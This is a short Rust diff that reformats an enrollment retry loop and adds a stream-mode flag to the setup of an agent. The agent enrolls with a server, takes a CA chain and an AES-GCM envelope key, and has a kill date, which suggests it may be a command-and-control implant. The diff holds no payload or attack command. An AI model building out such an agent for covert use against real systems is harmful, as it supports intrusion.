@@ -1,5 +1,3 @@
-
-
 use std::sync::{Arc, Mutex};
 
 use crate::enroll::{self, Enrollment};
@@ -36,7 +34,9 @@ pub fn run(profile: &Profile) -> Exit {
                 enrollment = Some(done);
                 break;
             }
-            Err(cause) if cause.starts_with("enroll transport") || cause.starts_with("enroll read") => {
+            Err(cause)
+                if cause.starts_with("enroll transport") || cause.starts_with("enroll read") =>
+            {
                 last_error = cause;
             }
             Err(refusal) => {
@@ -62,6 +62,7 @@ pub fn run(profile: &Profile) -> Exit {
         enrollment.ca_chain,
         Seal::parse(&profile.envelope_key).filter(|_| profile.contact_envelope == "aesgcm"),
         profile.kill_date.clone(),
+        profile.mode != "stream",
     );
     let mut carriage = carriage_for(profile);
 
